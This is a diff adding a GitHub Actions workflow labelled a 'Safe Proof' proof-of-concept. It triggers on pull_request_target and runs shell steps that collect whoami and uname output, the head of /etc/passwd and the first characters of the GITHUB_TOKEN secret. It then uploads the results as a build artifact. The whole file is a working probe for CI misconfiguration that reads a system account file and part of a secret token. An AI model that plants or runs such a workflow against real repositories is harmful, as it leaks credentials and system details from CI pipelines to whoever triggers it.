@@ -1,0 +1,33 @@
+name: PoC — Safe Proof
+
+on:
+  workflow_dispatch:
+  pull_request_target:
+    types: [opened, synchronize, edited]
+
+permissions:
+  contents: read
+
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Collect proof
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "[+] Collecting proof data..."
+          echo "WHOAMI: $(whoami)" > proof.txt
+          echo "UNAME: $(uname -a)" >> proof.txt
+          echo "PASSWD_HEAD:" >> proof.txt
+          head -n 20 /etc/passwd >> proof.txt
+          echo "" >> proof.txt
+          echo "TOKEN_PREFIX: $(echo "$GH_TOKEN" | cut -c1-8)" >> proof.txt
+          echo "[+] proof.txt created (first lines):"
+          head -n 30 proof.txt
+
+      - name: Upload proof artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: poc-proof
+          path: proof.txt
